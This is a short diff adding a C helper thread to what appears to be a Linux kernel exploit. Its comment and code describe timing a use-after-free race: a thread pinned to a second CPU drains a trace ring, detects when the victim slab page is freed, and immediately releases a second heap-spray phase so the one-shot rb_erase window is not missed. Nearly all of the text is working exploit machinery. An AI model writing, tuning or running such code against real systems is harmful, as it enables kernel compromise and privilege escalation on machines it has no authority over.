+/*
+ * v4: the victim page free happens during exec, before the zombie appears.
+ * The v3 post-zombie loop only catches the ring event if it survived the
+ * exec-to-zombie window; under ring traffic the event is overwritten and
+ * the release falls to the 150 ms fallback -- far past the one-shot
+ * rb_erase window (~10-60 ms; PD2405 run 6 phase 2: fallback release at
+ * 229 ms, burst hit=0).  This watcher drains the exec cpu ring from a
+ * foreign cpu while the parent blocks in wait_zombie(), so the free is
+ * seen within a few ms of the fire and phase 2 releases immediately.
+ * The race window on the trigger cpu stays untouched.
+ */
+static void *free_watch_thread(void *x)
+{
+    unsigned char *buf;
+    long t0 = now_ms();
+
+    (void)x;
+    buf = malloc(1u << 20);
+    if (!buf)
+        return NULL;
+    pin(g_cpu == 0 ? 1 : 0);
+    prctl(PR_SET_NAME, "yfreewatch", 0, 0, 0);
+    while (!atomic_load(&g_pre_free) && !atomic_load(&g_stop_spray))
+    {
+        long m = read_fd(g_rawfd[g_cpu], buf, 1u << 20);
+
+        if (m > 0 && scan_page_free(buf, (size_t)m, g_watch_pfn))
+        {
+            atomic_store(&g_burst2, 1);
+            atomic_store(&g_pre_free, 1);
+            logf("[+] plant free watch: victim slab freed; "
+                 "phase2 released at %ldms\n", now_ms() - t0);
+            break;
+        }
+        usleep(100);
+    }
+    free(buf);
+    return NULL;
+}
